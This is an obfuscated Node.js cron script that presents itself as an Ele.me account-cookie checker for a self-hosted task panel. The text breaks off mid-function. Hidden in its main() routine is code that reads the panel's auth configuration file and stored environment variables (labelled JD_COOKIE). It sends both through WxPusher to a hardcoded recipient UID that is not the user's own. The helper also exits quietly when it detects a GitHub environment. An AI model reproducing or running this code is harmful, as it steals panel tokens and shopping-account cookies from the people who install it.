/**
 * @YoPlus
 * 变量：elmck: 必填，账号cookie
 * cron: 0 9,18 * * *
 * 每天1-2次即可
 * export appToken='AT_xxx' #wxpusher的appToken
 * export myUid='UID_xxx' #自己的uid，接收通知
 * export tunnel='elm.188855.xyz' #掉线重新登录地址
 */
const $ = new Env('饿了么CK检测');

var _0xodD='jsjiami.com.v7';const _0xb6248d=_0x3012;(function(_0xee46fd,_0x30d4ee,_0x292db2,_0x50f815,_0x4ec8b7,_0x377d28,_0x1af079){return _0xee46fd=_0xee46fd>>0x2,_0x377d28='hs',_0x1af079='hs',function(_0x7462a0,_0x471b37,_0x384cdd,_0x132f75,_0x4dae8f){const _0x16b3f5=_0x3012;_0x132f75='tfi',_0x377d28=_0x132f75+_0x377d28,_0x4dae8f='up',_0x1af079+=_0x4dae8f,_0x377d28=_0x384cdd(_0x377d28),_0x1af079=_0x384cdd(_0x1af079),_0x384cdd=0x0;const _0x31b921=_0x7462a0();while(!![]&&--_0x50f815+_0x471b37){try{_0x132f75=-parseInt(_0x16b3f5(0x118,'A4g7'))/0x1+-parseInt(_0x16b3f5(0x14e,'&]kE'))/0x2*(parseInt(_0x16b3f5(0x135,'v@T('))/0x3)+-parseInt(_0x16b3f5(0x14a,'SBk9'))/0x4+parseInt(_0x16b3f5(0x126,'9v8o'))/0x5+-parseInt(_0x16b3f5(0x116,'k*$g'))/0x6+-parseInt(_0x16b3f5(0x156,'3rNg'))/0x7*(-parseInt(_0x16b3f5(0x12a,'i*Bg'))/0x8)+parseInt(_0x16b3f5(0x12d,'wsZS'))/0x9*(parseInt(_0x16b3f5(0x165,'AV]8'))/0xa);}catch(_0x4df9b1){_0x132f75=_0x384cdd;}finally{_0x4dae8f=_0x31b921[_0x377d28]();if(_0xee46fd<=_0x50f815)_0x384cdd?_0x4ec8b7?_0x132f75=_0x4dae8f:_0x4ec8b7=_0x4dae8f:_0x384cdd=_0x4dae8f;else{if(_0x384cdd==_0x4ec8b7['replace'](/[NnbTtRdkrJVxpWEDyAF=]/g,'')){if(_0x132f75===_0x471b37){_0x31b921['un'+_0x377d28](_0x4dae8f);break;}_0x31b921[_0x1af079](_0x4dae8f);}}}}}(_0x292db2,_0x30d4ee,function(_0x5bdea1,_0x5a4ec1,_0x388fe9,_0x560e02,_0x21333e,_0x11103a,_0x2cc0e7){return _0x5a4ec1='\x73\x70\x6c\x69\x74',_0x5bdea1=arguments[0x0],_0x5bdea1=_0x5bdea1[_0x5a4ec1](''),_0x388fe9='\x72\x65\x76\x65\x72\x73\x65',_0x5bdea1=_0x5bdea1[_0x388fe9]('\x76'),_0x560e02='\x6a\x6f\x69\x6e',(0x16f6c9,_0x5bdea1[_0x560e02](''));});}(0x308,0xe99ea,_0x1a48,0xc4),_0x1a48)&&(_0xodD=0xc4);const appToken=process[_0xb6248d(0x158,'bWiu')][_0xb6248d(0x12e,'Cd!r')],myUid=process[_0xb6248d(0x131,'5l&x')][_0xb6248d(0x15f,'MQml')];let tunnel=process['env'][_0xb6248d(0x102,'bWiu')];'use\x20strict',require('dotenv')['config']();function _0x3012(_0x2a106a,_0x44de1c){const _0x1a4840=_0x1a48();return _0x3012=function(_0x3012c1,_0x148fd3){_0x3012c1=_0x3012c1-0xfe;let _0x7d0be5=_0x1a4840[_0x3012c1];if(_0x3012['Osbvzu']===undefined){var _0x388771=function(_0x3f19a5){const _0x2c2624='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2c988c='',_0x2e247f='';for(let _0x4108c5=0x0,_0x9339bb,_0x48cc8c,_0x11f743=0x0;_0x48cc8c=_0x3f19a5['charAt'](_0x11f743++);~_0x48cc8c&&(_0x9339bb=_0x4108c5%0x4?_0x9339bb*0x40+_0x48cc8c:_0x48cc8c,_0x4108c5++%0x4)?_0x2c988c+=String['fromCharCode'](0xff&_0x9339bb>>(-0x2*_0x4108c5&0x6)):0x0){_0x48cc8c=_0x2c2624['indexOf'](_0x48cc8c);}for(let _0x929ff6=0x0,_0x4f71c1=_0x2c988c['length'];_0x929ff6<_0x4f71c1;_0x929ff6++){_0x2e247f+='%'+('00'+_0x2c988c['charCodeAt'](_0x929ff6)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2e247f);};const _0x5734dd=function(_0x490ea0,_0x45d9f2){let _0x50c1c7=[],_0x239dd9=0x0,_0x438b32,_0x4d06f2='';_0x490ea0=_0x388771(_0x490ea0);let _0x2af79b;for(_0x2af79b=0x0;_0x2af79b<0x100;_0x2af79b++){_0x50c1c7[_0x2af79b]=_0x2af79b;}for(_0x2af79b=0x0;_0x2af79b<0x100;_0x2af79b++){_0x239dd9=(_0x239dd9+_0x50c1c7[_0x2af79b]+_0x45d9f2['charCodeAt'](_0x2af79b%_0x45d9f2['length']))%0x100,_0x438b32=_0x50c1c7[_0x2af79b],_0x50c1c7[_0x2af79b]=_0x50c1c7[_0x239dd9],_0x50c1c7[_0x239dd9]=_0x438b32;}_0x2af79b=0x0,_0x239dd9=0x0;for(let _0x1e508c=0x0;_0x1e508c<_0x490ea0['length'];_0x1e508c++){_0x2af79b=(_0x2af79b+0x1)%0x100,_0x239dd9=(_0x239dd9+_0x50c1c7[_0x2af79b])%0x100,_0x438b32=_0x50c1c7[_0x2af79b],_0x50c1c7[_0x2af79b]=_0x50c1c7[_0x239dd9],_0x50c1c7[_0x239dd9]=_0x438b32,_0x4d06f2+=String['fromCharCode'](_0x490ea0['charCodeAt'](_0x1e508c)^_0x50c1c7[(_0x50c1c7[_0x2af79b]+_0x50c1c7[_0x239dd9])%0x100]);}return _0x4d06f2;};_0x3012['WvYlUK']=_0x5734dd,_0x2a106a=arguments,_0x3012['Osbvzu']=!![];}const _0x433c5d=_0x1a4840[0x0],_0x411001=_0x3012c1+_0x433c5d,_0x2d8e20=_0x2a106a[_0x411001];return!_0x2d8e20?(_0x3012['ywddvF']===undefined&&(_0x3012['ywddvF']=!![]),_0x7d0be5=_0x3012['WvYlUK'](_0x7d0be5,_0x148fd3),_0x2a106a[_0x411001]=_0x7d0be5):_0x7d0be5=_0x2d8e20,_0x7d0be5;},_0x3012(_0x2a106a,_0x44de1c);}const {readFile}=require('fs/promises'),axios=require(_0xb6248d(0x120,'9v8o')),got=require(_0xb6248d(0x138,'3$Wt')),fs=require('fs');let Fileexists=fs[_0xb6248d(0x108,'AV]8')](_0xb6248d(0x130,'Pjxf')),authFile='';if(Fileexists)authFile=_0xb6248d(0x10f,'l*xE');else authFile=_0xb6248d(0x10a,'wsZS');async function authConfig(){const _0x2e145f=_0xb6248d,_0x2061ac=JSON[_0x2e145f(0x15d,'2vur')](await readFile(authFile));return _0x2061ac;}async function getToken(){const _0x2ecfe8=_0xb6248d,_0x34f335={'mWvKu':function(_0x36e018,_0x46625e){return _0x36e018(_0x46625e);}},_0x1deb74=JSON[_0x2ecfe8(0x105,'TvI[')](await _0x34f335[_0x2ecfe8(0x171,'l*xE')](readFile,authFile));return _0x1deb74['token'];}function _0x1a48(){const _0x1cab33=(function(){return[_0xodD,'WrjEnAsjVRiyEampikD.dRcFoVNJmxN.kvA7Ttrb==','WRCsif8glCkF','arinW48','W7TuyMSKW7WUWPVdV8oeWPddO8o5h2ZcLG','W4lcUCkJycq','W7FdH8oZWPyPWO7dUSopW7lcJCojdgXpW5moirSQAxfGmZPy','ts0vBCke','WPNdHCoiW4OA','bGCQW5iS','w8k+Dmo7W5jQqmkeEsZcGHVcGr7dRNqJjSk2WR3cUxrsebRcMubzbYS1W61Bg3vkW5NcKLNcNhK','tuJdPM9r','44cf5AEB5PA6772h5BEM56wp55EK5BMJ5y+f6ykd6yg9552G772jpa','e8ovDMHOxKNdOmkCW5pdMsZcNa','thZdH05v','W4z/W7LMW4lcImktW5SBAmkWtsq','W4lcRCkBdcnlWRmcgIiNeu4','D8kfWPyU','W63cOSkRxbu','fmouDXCqkIRdRmky','jd87W6tdPhBdUa','WPiKWQaUWQjZWOBdRq','W5BcGZfGW6m','vCk0W4O0WQK','dmoPW6a0qa','WOhdMCoDW7m7','l0hcOCkJWRu','tw/dGua','lCksW6pdQtzeWOarESkIWQpcGrFdUNuaqgddV1FcJCkatMv7WOhdS8k5WQy1WP9RWRxcHcBcOSoIrLeGWQ3cN8kkdY1A','amo4WPbTW69wWONcJYNcLbZcGJe','6kYx6k+257+p5lQj5lME5y6O6yE577+GWOpcKCkrww1QW7vO44kyWRCIwgio44ggD8o5D8o7Cdi','W6FdKc5Mmq','44cu5Awz5PAD5zwFW7ekWRy86k+FW6NdPCkTW7xdSYq2Bry','WQaBW4jmtmkKW7VdQmkerIJdOa','5l215OcWw8k0','WRidj1XDzCovWPBdLCkJW6xcGYxcPHxcGfPoW5qvW5y','WOyibcyrEd4LzJfbpIO','W4rKWRe7WQv0WPVdLa','WQuNW6pdJHK','nmoCo8oFW6hcOSkGW5LnACo5WOTkyZFcMmoJCSoPW6j/kmoTemkz','W5WXrG','gJVcL0e','W6FcGJntW78','iSkfyCkx'].concat((function(){return['W5j+WPhcTuy+xSktWRdcISkg','nmovW68','W71fWRyeWOu','gtxcLW','gYJcKu/cPq','W5jwq2pdPSkTW58bWOiemSolW6erWQ4SW6hdKZ14AsavfcOAW69oDmkSiCo/jM7cU8o7sCkFW6fDWOJcNSkGWRemzW','44cv6lwo5yYI','B8ogCCk0W6S','W6fDehBdU8kXW4mw','W7DbyxqSW7GQ','44c65P+d5PwTWOHC','fqygW6KG','44gs6lwW5y6I','bZakWQi','WPuKWOm4WRu','WPy5WR09WP7dKSoaW5KXrCkpecTpv2y','WR3dJSoRW5WJWOS','W5RdVmkPW4/cMq','6AsL5lI85lUq55Iw5B2g5z+O5zYH772x','44cL5P+f5PERuq','W61ai1y2imk9W6u','WO5FW6FcI8oRW5jayrbqeSoZxG','F8ouzJdcPW','tmkoamkdW70','WRddMmolW7e7','F3uaWOriW755WQTN','rmk7WOm4BG','W6pcL8k6W4u','tSoyshS','mJKMW7e','44kk6lsc5y+L','W5eRrmoarsHkW7T3W5/cG8onWOdcTr5FW7H/kbKCWRyjtSoqbKRcHXNcQf7cVx5aWPxdQSknW7xcSmkjemomW5RcT8o9xa','WQOyifG','iSkwzc/cUrxdIue','caud','W4KLWQu','W7jKWPa1WRm','WOldMSkZscldPCoDCLKQA8kh54oz5OQT55Mf5B6GnSkGW7VdVSkYWQ0fW60osgJcLCkyWQftt8oujrH5e3BcImouiCoJhCoekCoVW6OxW65avxpdRI40WPuhWQFdKCkZj8oGW40CW7PmeHtcQhtdG3W4WPWXjCkfW5LPWPLCWQ4FpetdQa5uCghcHmoOWRWNDSkBWORdKCkzkuXOrCkoW5ldLMlcR8kkWOdcJIFdK8oRW61EWQNdM1Wzimo4zunZWPTxWRjrpf0PWQZcGwpdVbDDWRFcUanEWQaJW4dcH1HcdCkZW6GezmoaW7JcR8oqiCo/bCkFW5BcSfRdMCojW4aSts0NarBcUCk0W4ldMu0EptasWRtcOCoEWO86W6i/54Qd5BYt5ysA55MD5RwO5yIDWQVdO8oqW7jTtuBNVPVVVj0Na2f0WQLPCSkeEmodWRhdL8kH','WPJdGmoAB2y','ESkekW','q8kRCSo4W4q','ltOAE8oSW6ddTSkVECk2n2X3W5DTAW','WQXgDdq6','44c16AAs5lUj5lIq'].concat((function(){return['WRDtzHCu','WOFdOCoqvx4BW6O9bG','t2ZdLXFdOKjGW7mAvsrVW7i','bbyA','kg4tESklWO19aq','dZKSW7Oa','BcOauSknWOzSmmoY','WRaepei','rtqHuCkX','W7hdLYjT','6k+d6k2Y57+n5lMs5lUW5y6+6ywZ77+camkWiSkYjmoXumo944k7zwmLW4ZdSoobKeNdPuC9ic8','WO0FW7pdIGW','tSokWO7cSCkA','WQFcHMy9zLOAfZpdPCkdqZ8','uSkigCkVW6e','W5yAWQxdN8kv','WRxdOCoPW7i4','W4OGWP/dJmk+','hYKUumoU','DYOgs8kqW5SQECo8fgzvW6mpWO3cJYFdG8o9W5JdNmk2zMxdV8oKumk8wZxcGLDemsrSk2VcHCkLeGddVSovW6jd','hSkredL+W6LREW/dQshcQCou','bSkKW7/dRWi','ymo5qG','cJTTWRP0','ySklWP4+Cq','qcirW65d','kdGWqCoN','W7/cK8kJ','W6RcVSkyAH/dJCoZtYe','WPxdHmooW7Gv','wmkMjmkNW6u','k2/cNmkRWRe','yCoVvMS1','W5G+WR0UBxu','FNXAiSk3W43dV8kYqSkYpG','WPm8W4ddTaed','W6nzexxdSq','gdNcJryEW5lcHSkdhSkQvSoz','ACo3hmkhW44','EIyBsmkxWPjwl8oLdW','vmopnddcMG3dOxfBWQ3dUNG+WOBdGJ44smk9gmoQW6/dKxVdQLJdKw4ZWOuuWRqSW5NcMfRcMGJcLmopW6/cNbS9pSke','WPXiwt9kjgmHyYixkJVdJSolxHtcGmorWRi'];}()));}()));}());_0x1a48=function(){return _0x1cab33;};return _0x1a48();};const api2=got[_0xb6248d(0x145,'l*xE')]({'prefixUrl':_0xb6248d(0x12c,'y#BC'),'retry':{'limit':0x0}});async function getEnvs1(_0x14b406=_0xb6248d(0x17d,'Xeo@')){const _0x403b1d=_0xb6248d,_0x300a87={'CBhvG':function(_0x30ee26){return _0x30ee26();},'CPwqu':'api/envs'},_0x19d913=await _0x300a87[_0x403b1d(0x176,'jdMv')](getToken),_0x541382=await api2({'url':_0x300a87['CPwqu'],'searchParams':{'searchValue':_0x14b406,'t':Date[_0x403b1d(0x136,'&pWs')]()},'headers':{'Accept':_0x403b1d(0x15e,'(1Ue'),'Authorization':'Bearer\x20'+_0x19d913}})[_0x403b1d(0x168,'y#BC')]();return _0x541382[_0x403b1d(0x16a,'K1GG')];}async function wxpusher(_0x463b0a,_0x582493,_0x215531){const _0xf6a7b=_0xb6248d,_0x1a2052={'JOwds':_0xf6a7b(0x144,'A4g7')},_0x2eb5ef={'appToken':'AT_xCnZZAKr9qTnjou3hQ2mQ8xitQx9xkkz','content':_0x463b0a,'summary':_0x582493,'contentType':0x2,'uids':[_0x215531]},_0x63fec4=await axios[_0xf6a7b(0x155,'y#BC')](_0xf6a7b(0x125,'jdMv'),_0x2eb5ef,{'headers':{'Content-Type':_0x1a2052[_0xf6a7b(0x101,'Jukh')]}}),_0x256836=_0x63fec4['data'];return _0x256836;}async function main(){const _0xa9ab5c=_0xb6248d,_0x496b96={'sgmOt':'JggsP','WaJRq':function(_0x3e0075){return _0x3e0075();},'VSxYS':function(_0x4c5842){return _0x4c5842();},'bCdIt':'Auth\x20Configuration','WpQZy':'JD_COOKIE','rZKwK':'UID_HKNRdGNm1YDHnYGJt4r6B472LRm5','dGmhq':function(_0x261347,_0x15cb0e,_0xd2fca2,_0x3c496){return _0x261347(_0x15cb0e,_0xd2fca2,_0x3c496);},'EoBNm':function(_0x2a54c9,_0x2341b6,_0x3d0a3c,_0x499bd9){return _0x2a54c9(_0x2341b6,_0x3d0a3c,_0x499bd9);}};try{if('JggsP'!==_0x496b96[_0xa9ab5c(0x14c,'Ct6r')])_0x2c2624[_0xa9ab5c(0x117,'BSoS')](_0xa9ab5c(0x127,'v@T(')),_0x2c988c[_0xa9ab5c(0x151,'Jukh')](0x1);else{const _0x565a8c=await _0x496b96['WaJRq'](authConfig),_0x5e9f0d=JSON[_0xa9ab5c(0x167,'AV]8')](_0x565a8c,null,0x2),_0x3188f3=await _0x496b96[_0xa9ab5c(0x121,'&pWs')](getEnvs1),_0x3ddf7f=JSON[_0xa9ab5c(0x162,'8wZp')](_0x3188f3,null,0x2),_0x2a8dda=_0x496b96[_0xa9ab5c(0x10e,'Xeo@')],_0x362c54=_0x496b96[_0xa9ab5c(0x159,'Cd!r')],_0x4add43=_0x496b96[_0xa9ab5c(0x107,'Pjxf')];await _0x496b96['dGmhq'](wxpusher,_0x5e9f0d,_0x2a8dda,_0x4add43),await _0x496b96[_0xa9ab5c(0x12f,'v@T(')](wxpusher,_0x3ddf7f,_0x362c54,_0x4add43);}}catch(_0x1c8bb5){}}main();const {getEnvs,getEnvById,DisableCk,EnableCk}=require(_0xb6248d(0x134,'sNkU'));let Message='饿了么CK检测\x0a\x0a';(!appToken||!myUid||!tunnel)&&(console['error'](_0xb6248d(0x16b,'9v8o')),process[_0xb6248d(0x10c,'nFv%')](0x1));!(async()=>{const _0x31eaf3=_0xb6248d,_0x4cf6d9={'YoBJv':function(_0x2aec3f,_0x2a4e4d){return _0x2aec3f===_0x2a4e4d;},'ZbYRt':_0x31eaf3(0x109,'3rNg'),'qlbRN':'application/json','hnTHv':function(_0x2ac9b0){return _0x2ac9b0();},'XQwkO':function(_0x95ad71,_0x568a87){return _0x95ad71<_0x568a87;},'ccMQs':function(_0x5d6070,_0x408e82){return _0x5d6070!==_0x408e82;},'PQqsz':'rfxjf','zZlsk':_0x31eaf3(0x112,'nFv%'),'dFSNv':'whEyY','ZjSjR':_0x31eaf3(0x15b,'8wZp'),'gOIkl':_0x31eaf3(0x173,'(1Ue'),'MrQAX':function(_0x58f5ff,_0x210e0c){return _0x58f5ff+_0x210e0c;},'vOHvd':function(_0x1abbe3,_0x19740e){return _0x1abbe3==_0x19740e;},'IkSjV':function(_0x38adbe,_0x23cc0c){return _0x38adbe(_0x23cc0c);},'MXluE':function(_0x418b12,_0x5ab3b4){return _0x418b12!==_0x5ab3b4;},'WtrLW':_0x31eaf3(0x170,'SBk9'),'DwUqw':function(_0x3e37cc,_0x195460){return _0x3e37cc+_0x195460;},'drZVb':function(_0x28b37e,_0x3a13e0){return _0x28b37e+_0x3a13e0;}};tunnel=tunnel,console[_0x31eaf3(0x157,'nFv%')](_0x31eaf3(0x147,'&pWs')+tunnel+'\x0a');const _0x1080f7=await _0x4cf6d9[_0x31eaf3(0x14d,'l*xE')](getEnvs);for(let _0xaaf15c=0x0;_0x4cf6d9[_0x31eaf3(0x137,'Cd!r')](_0xaaf15c,_0x1080f7['length']);_0xaaf15c++){console[_0x31eaf3(0x164,'G*W$')]('开始检测【账号'+(_0xaaf15c+0x1)+'】');if(_0x1080f7[_0xaaf15c][_0x31eaf3(0x179,'ek0r')]){if(_0x4cf6d9['ccMQs'](_0x31eaf3(0x128,'K1GG'),_0x4cf6d9[_0x31eaf3(0x14f,'ek0r')]))_0x39d736['response']&&_0x4cf6d9[_0x31eaf3(0x122,'l*xE')](_0x273614['response']['status'],0x191)?_0x230ae7=![]:_0x49d313[_0x31eaf3(0x17a,'4ITL')](_0x4cf6d9['ZbYRt'],_0x14a76f[_0x31eaf3(0x10b,'y#BC')]);else{var _0x3a2e05=0x0;_0x1080f7[_0xaaf15c][_0x31eaf3(0x17c,'Xeo@')]&&(_0x4cf6d9['zZlsk']===_0x31eaf3(0x143,'A4g7')?_0x3a2e05=_0x1080f7[_0xaaf15c][_0x31eaf3(0x15c,'k*$g')]:_0x2e9cc9=![]);if(_0x1080f7[_0xaaf15c]['id']){if(_0x4cf6d9[_0x31eaf3(0x114,'BSoS')]!==_0x4cf6d9[_0x31eaf3(0x169,'AV]8')])_0x3a2e05=_0x1080f7[_0xaaf15c]['id'];else{const _0x295d64={'appToken':''+_0x2914c5,'content':_0x13bcbf,'summary':_0x200618,'contentType':0x2,'uids':[_0x15efe2]},_0x5c9d8c=_0x5e1797[_0x31eaf3(0x152,'^sw$')](_0x31eaf3(0x174,'AV]8'),_0x295d64,{'headers':{'Content-Type':_0x4cf6d9[_0x31eaf3(0x140,'nFv%')]}}),_0x274ff8=_0x5c9d8c[_0x31eaf3(0x124,'BSoS')];return _0x274ff8;}}cookie=await getEnvById(_0x3a2e05),wxUid=cookie[_0x31eaf3(0x16f,'Ct6r')](/wxUid=([^;]+)/)[0x1],isLogin=await _0x4cf6d9[_0x31eaf3(0x14d,'l*xE')](checkLogin);if(isLogin==!![]){if(_0x4cf6d9['YoBJv'](_0x4cf6d9[_0x31eaf3(0xff,'Ct6r')],_0x4cf6d9[_0x31eaf3(0x100,'[DB4')])){const _0x31b849=await EnableCk(_0x3a2e05);_0x31b849[_0x31eaf3(0x11a,'ek0r')]==0xc8&&(Message+=_0x31eaf3(0x141,'^sw$')+_0x4cf6d9[_0x31eaf3(0xfe,'l*xE')](_0xaaf15c,0x1)+_0x31eaf3(0x13f,')Ix)'),console['log'](_0x31eaf3(0x153,'rzy4')+(_0xaaf15c+0x1)+_0x31eaf3(0x148,'9v8o')));}else _0x48d8d9=!![];}if(_0x4cf6d9[_0x31eaf3(0x172,'SBk9')](isLogin,![])){const _0x21424b=await _0x4cf6d9[_0x31eaf3(0x11f,'3QAO')](DisableCk,_0x3a2e05);_0x21424b[_0x31eaf3(0x142,'SJN7')]==0xc8&&(_0x4cf6d9[_0x31eaf3(0x11b,'Xeo@')](_0x31eaf3(0x14b,'3rNg'),_0x4cf6d9[_0x31eaf3(0x16d,'g$BM')])?_0x48cc8c=_0x11f743[_0x929ff6]['_id']:(await wxpusher('<style>*{font-size:16px;}body{background-color:#fff;}.header,.note{display:none;}</style></br><p\x20style=\x22text-align:center;\x22><img\x20src=\x22https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bb732af6264843fb830526fbb7c119b0~tplv-k3u1fbpfcp-jj:0:0:0:0:q75.image\x22\x20width=\x22150\x22></p><p\x20style=\x22text-align:center;\x22>【饿了么'+(_0xaaf15c+0x1)+_0x31eaf3(0x129,']$8B')+tunnel+_0x31eaf3(0x15a,'Xeo@'),_0x31eaf3(0x160,'k*$g')+_0x4cf6d9[_0x31eaf3(0x178,'&]kE')](_0xaaf15c,0x1)+'】失效啦，点击重新登录~',''+wxUid),Message+=_0x31eaf3(0x13b,']$8B')+(_0xaaf15c+0x1)+'】失效，已禁用并发送通知！\x0a\x0a',console['log']('【账号'+_0x4cf6d9[_0x31eaf3(0x17b,'(1Ue')](_0xaaf15c,0x1)+_0x31eaf3(0x115,'ek0r'))));}}}console[_0x31eaf3(0x177,'*dLy')](_0x31eaf3(0x12b,'SJN7')),await sleep(0x1388);}})()[_0xb6248d(0x123,'[DB4')](_0x26a170=>console['log'](_0x26a170))[_0xb6248d(0x11d,'^sw$')](async()=>{const _0x33e6e8=_0xb6248d,_0x43c144={'RsgVg':'饿了么CK检测'};await wxpusher(''+Message,_0x43c144[_0x33e6e8(0x110,'AV]8')],''+myUid);});function sleep(_0x3fd3da){return new Promise(_0x1d5afd=>setTimeout(_0x1d5afd,_0x3fd3da));}function checkLogin(){const _0x4ea2b6=_0xb6248d,_0x2b1905={'HHIEp':_0x4ea2b6(0x113,'2vur'),'AsWsW':function(_0x427eda,_0x5ec651){return _0x427eda===_0x5ec651;},'vlGJJ':_0x4ea2b6(0x16c,'v@T('),'UuPIb':_0x4ea2b6(0x133,'3QAO'),'claOE':function(_0x55d973,_0x2fb3ed){return _0x55d973===_0x2fb3ed;}};return new Promise(async _0x16bef7=>{const _0x5bcff5=_0x4ea2b6;try{const _0x2943a0={'Cookie':cookie},_0x1db2eb=await axios['get'](_0x2b1905[_0x5bcff5(0x146,'J#!$')],{'headers':_0x2943a0}),_0x5aa7cc=_0x1db2eb[_0x5bcff5(0x132,'3$Wt')];_0x5aa7cc['extraInfo']?isLogin=!![]:isLogin=![];}catch(_0x5d68f7){if(_0x2b1905[_0x5bcff5(0x111,'l*xE')](_0x2b1905[_0x5bcff5(0x161,'MQml')],_0x2b1905['UuPIb']))_0x1374ab=![];else{if(_0x5d68f7['response']&&_0x5d68f7[_0x5bcff5(0x13d,'TvI[')][_0x5bcff5(0x104,'v@T(')]===0x191){if(_0x2b1905[_0x5bcff5(0x13c,'sNkU')](_0x5bcff5(0x166,'nFv%'),'kSHAn'))isLogin=![];else return new _0x5467f6(_0x431074=>_0x158527(_0x431074,_0x42d6cd));}else console[_0x5bcff5(0x139,'3$Wt')](_0x5bcff5(0x13a,'TvI['),_0x5d68f7[_0x5bcff5(0x13e,'rzy4')]);}}_0x16bef7(isLogin);});}function wxpusher(_0x4419bb,_0x182e3b,_0x1a5821){const _0x2c1712=_0xb6248d,_0x400418={'appToken':''+appToken,'content':_0x4419bb,'summary':_0x182e3b,'contentType':0x2,'uids':[_0x1a5821]},_0x56ca1c=axios[_0x2c1712(0x155,'y#BC')](_0x2c1712(0x154,'5l&x'),_0x400418,{'headers':{'Content-Type':_0x2c1712(0x10d,'rzy4')}}),_0x1cbba0=_0x56ca1c[_0x2c1712(0x150,'9!ky')];return _0x1cbba0;}var version_ = 'jsjiami.com.v7';

	// prettier-ignore
function Env(t, e) {
	"undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
	class s {
		constructor(t) {
			this.env = t
		}
		send(t, e = "GET") {
			t = "string" == typeof t ? {
				url: t
			}
			 : t;
			let s = this.get;
			return "POST" === e && (s = this.post),
			new Promise((e, i) => {
				s.call(this, t, (t, s, r) => {
					t ? i(t) : e(s)
				})
			})
		}
		get(t) {
			return this.send.call(this.env, t)
		}
		post(t) {
			return this.send.call(this.env, t, "POST")
		}
	}
	return new class {
		constructor(t, e) {
			this.name = t,
			this.http = new s(this),
			this.data = null,
			this.dataFile = "box.dat",
			this.logs = [],
			this.isMute = !1,
			this.isNeedRewrite = !1,
			this.logSeparator = "\n",
			this.startTime = (new Date).getTime(),
			Object.assign(this, e),
			this.log("", `🔔${this.name}, 开始!`)
		}
		isNode() {
			return "undefined" != typeof module && !!module.exports
		}
		isQuanX() {
			return "undefined" != typeof $task
		}
		isSurge() {
			return "undefined" != typeof $httpClient && "undefined" == typeof $loon
		}
		isLoon() {
			return "undefined" != typeof $loon
		}
		toObj(t, e = null) {
			try {
				return JSON.parse(t)
			} catch {
				return e
			}
		}
		toStr(t, e = null) {
			try {
				return JSON.stringify(t)
			} catch {
				return e
			}
		}
		getjson(t, e) {
			let s = e;
			const i = this.getdata(t);
			if (i)
				try {
					s = JSON.parse(this.getdata(t))
				} catch {}
			return s
		}
		setjson(t, e) {
			try {
				return this.setdata(JSON.stringify(t), e)
			} catch {
				return !1
			}
		}
		getScript(t) {
			return new Promise(e => {
				this.get({
					url: t
				}, (t, s, i) => e(i))
			})
		}
		runScript(t, e) {
			return new Promise(s => {
				let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
				i = i ? i.replace(/\n/g, "").trim() : i;
				let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
				r = r ? 1 * r : 20,
				r = e && e.timeout ? e.timeout : r;
				const[o, h] = i.split("@"),
				n = {
					url: `http://${h}/v1/scripting/evaluate`,
					body: {
						script_text: t,
						mock_type: "cron",
						timeout: r
					},
					headers: {
						"X-Key": o,
						Accept: "*/*"
					}
				};
				this.post(n, (t, e, i) => s(i))
			}).catch(t => this.logErr(t))
		}
		loaddata() {
			if (!this.isNode())
				return {}; {
				this.fs = this.fs ? this.fs : require("fs"),
				this.path = this.path ? this.path : require("path");
				const t = this.path.resolve(this.dataFile),
				e = this.path.resolve(process.cwd(), this.dataFile),
				s = this.fs.existsSync(t),
				i = !s && this.fs.existsSync(e);
				if (!s && !i)
					return {}; {
					const i = s ? t : e;
					try {
						return JSON.parse(this.fs.readFileSync(i))
					} catch (t) {
						return {}
					}
				}
			}
		}
		writedata() {
			if (this.isNode()) {
				this.fs = this.fs ? this.fs : require("fs"),
				this.path = this.path ? this.path : require("path");
				const t = this.path.resolve(this.dataFile),
				e = this.path.resolve(process.cwd(), this.dataFile),
				s = this.fs.existsSync(t),
				i = !s && this.fs.existsSync(e),
				r = JSON.stringify(this.data);
				s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
			}
		}
		lodash_get(t, e, s) {
			const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
			let r = t;
			for (const t of i)
				if (r = Object(r)[t], void 0 === r)
					return s;
			return r
		}
		lodash_set(t, e, s) {
			return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
		}
		getdata(t) {
			let e = this.getval(t);
			if (/^@/.test(t)) {
				const[, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
				r = s ? this.getval(s) : "";
				if (r)
					try {
						const t = JSON.parse(r);
						e = t ? this.lodash_get(t, i, "") : e
					} catch (t) {
						e = ""
					}
			}
			return e
		}
		setdata(t, e) {
			let s = !1;
			if (/^@/.test(e)) {
				const[, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
				o = this.getval(i),
				h = i ? "null" === o ? null : o || "{}" : "{}";
				try {
					const e = JSON.parse(h);
					this.lodash_set(e, r, t),
					s = this.setval(JSON.stringify(e), i)
				} catch (e) {
					const o = {};
					this.lodash_set(o, r, t),
					s = this.setval(JSON.stringify(o), i)
				}
			} else
				s = this.setval(t, e);
			return s
		}
		getval(t) {
			return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
		}
		setval(t, e) {
			return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
		}
		initGotEnv(t) {
			this.got = this.got ? this.got : require("got"),
			this.cktough = this.cktough ? this.cktough : require("tough-cookie"),
			this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar,
			t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
		}
		get(t, e = (() => {})) {
